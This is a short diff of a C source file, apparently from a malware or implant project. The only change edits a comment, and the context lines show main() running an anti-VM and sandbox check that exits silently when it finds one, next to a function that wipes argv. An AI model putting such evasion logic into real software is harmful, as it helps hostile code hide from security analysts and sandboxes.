@@ -80,7 +80,7 @@ static void wipe_argv(int argc, char *argv[]) {
 }
 
 int main(int argc, char *argv[]) {
-    // Production Evasion: Anti-VM & Stalling Logic
+    //  Evasion: Anti-VM & Stalling Logic
     if (ph_anti_vm_check()) {
         // Exit silently if VM/Sandbox detected
         _exit(0);
